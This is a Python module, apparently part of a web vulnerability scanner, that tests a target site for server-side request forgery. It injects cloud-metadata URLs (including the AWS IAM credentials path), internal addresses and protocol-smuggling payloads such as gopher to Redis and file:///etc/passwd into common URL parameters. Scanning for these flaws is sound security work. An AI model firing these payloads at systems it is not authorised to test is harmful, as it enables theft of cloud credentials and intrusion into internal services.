from __future__ import annotations

import asyncio

from ..core.models import Finding, Severity

# SSRF targets covering multiple cloud providers and internal services
TARGETS = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Alibaba
    "http://100.100.100.200/latest/meta-data/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    # Internal services
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    # Protocol smuggling
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/stat",
    "file:///etc/passwd",
]

# Specific indicators that only appear in actual internal/cloud responses
SSRF_INDICATORS = (
    "ami-id", "instance-id", "ami-launch-index", "security-credentials",
    "computeMetadata", "instance", "hostname", "root:x:", "daemon:",
    "redis_version", "memcached", "mongodb",
)

# Common parameters to test
PARAMS = [
    "url", "next", "redirect", "dest", "target", "uri", "callback",
    "path", "src", "source", "href", "link", "image", "file", "doc",
    "page", "feed", "host", "site", "to", "out", "view", "dir", "show",
    "navigation", "return", "returnTo", "return_to", "goto", "jump",
]


async def _probe(ctx, base: str, param: str, ssrf_target: str) -> bool:
    if not ctx.can_request():
        return False
    ctx.increment()
    baseline_resp = await ctx.http.get(base, params={param: "https://example.com"}, timeout=ctx.settings.timeout)
    baseline_body = (baseline_resp.text or "").lower()
    if not ctx.can_request():
        return False
    ctx.increment()
    resp = await ctx.http.get(base, params={param: ssrf_target}, timeout=ctx.settings.timeout)
    body = (resp.text or "").lower()
    new_indicators = [ind for ind in SSRF_INDICATORS if ind in body and ind not in baseline_body]
    return len(new_indicators) > 0


async def run(ctx) -> None:
    base = f"https://{ctx.target}"

    async def _probe_param(param: str) -> None:
        for ssrf_target in TARGETS:
            if not ctx.can_request():
                return
            found = await _probe(ctx, base, param, ssrf_target)
            if found:
                ctx.add_finding(Finding(
                    id=f"ssrf-{param}",
                    title=f"Potential SSRF via '{param}' parameter",
                    severity=Severity.HIGH,
                    confidence=0.7,
                    asset=f"{base}?{param}={ssrf_target}",
                    module="ssrf",
                    description="Response suggests internal resource access.",
                    remediation="Validate and allowlist outbound URLs; block internal ranges and protocols.",
                    tags=["ssrf"],
                ))
                return

    tasks = [_probe_param(param) for param in PARAMS]
    await asyncio.gather(*tasks, return_exceptions=True)